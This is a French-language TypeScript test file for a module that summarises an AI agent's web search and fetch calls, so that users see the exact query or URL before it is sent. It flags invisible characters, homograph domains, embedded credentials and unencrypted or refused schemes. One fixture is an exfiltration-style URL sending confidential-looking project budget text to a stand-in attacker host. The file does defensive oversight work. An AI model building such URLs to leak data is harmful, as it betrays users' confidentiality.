import { describe, expect, test } from 'bun:test';
import { describeWebUrl, summaries } from './webSummaries';
import { noSummaryContext, summarizeTool, type SummaryModules } from './summaryRegistry';

const mods: SummaryModules = { './webSummaries.ts': { summaries } };

describe('résumés du domaine web (PC93 : le texte exact qui partirait)', () => {
    test('web_search : requête entière, mot pour mot, avec ses options', () => {
        const q = 'budget projet Hélios gelé jusqu’à la réunion du comité de direction de mars 2027 chez Durand';
        const s = summarizeTool('web_search', { query: q, lang: 'fr', freshness: 'week' }, noSummaryContext, mods);
        expect(s).toContain(`« ${q} »`);
        expect(s).toContain('mot pour mot');
        expect(s).toContain('langue : fr');
        expect(s).toContain('de la dernière semaine');
    });

    test('web_search : 200 caractères affichés en entier (jamais tronqués)', () => {
        const q = 'a'.repeat(200);
        expect(summarizeTool('web_search', { query: q }, noSummaryContext, mods)).toContain(q);
    });

    test('web_search : un caractère invisible est signalé, même retiré de l’affichage', () => {
        const s = summarizeTool('web_search', { query: 'meteo\u200bparis\u202e' }, noSummaryContext, mods);
        expect(s).toContain('caractères invisibles');
        expect(s).not.toContain('\u202e');
    });

    test('web_fetch : adresse complète, chemin et requête compris', () => {
        const u = 'https://attaquant.example/collecte?d=Le%20budget%20du%20projet%20H%C3%A9lios&n=4512889';
        const s = summarizeTool('web_fetch', { url: u }, noSummaryContext, mods);
        expect(s).toContain(u);
        expect(s).toContain('site : attaquant.example');
    });

    test('web_fetch : URL de 2 000 caractères montrée en entier', () => {
        const u = `https://ex.example/${'x'.repeat(1981)}`;
        expect(u.length).toBe(2000);
        expect(summarizeTool('web_fetch', { url: u }, noSummaryContext, mods)).toContain(u);
    });

    test('web_fetch : hôte homographe montré en punycode', () => {
        expect(describeWebUrl('https://g\u043e\u043egle.com/')).toContain('xn--');
    });

    test('web_fetch : identifiants, http, schéma refusé et adresse illisible sont dits', () => {
        expect(describeWebUrl('https://moi:secret@ex.example/')).toContain('identifiants');
        expect(describeWebUrl('http://ex.example/')).toContain('non chiffrée');
        expect(describeWebUrl('ftp://ex.example/')).toContain('schéma refusé');
        expect(describeWebUrl('pas une url')).toContain('adresse illisible : pas une url');
        expect(describeWebUrl(undefined)).toBe('adresse absente');
    });
});
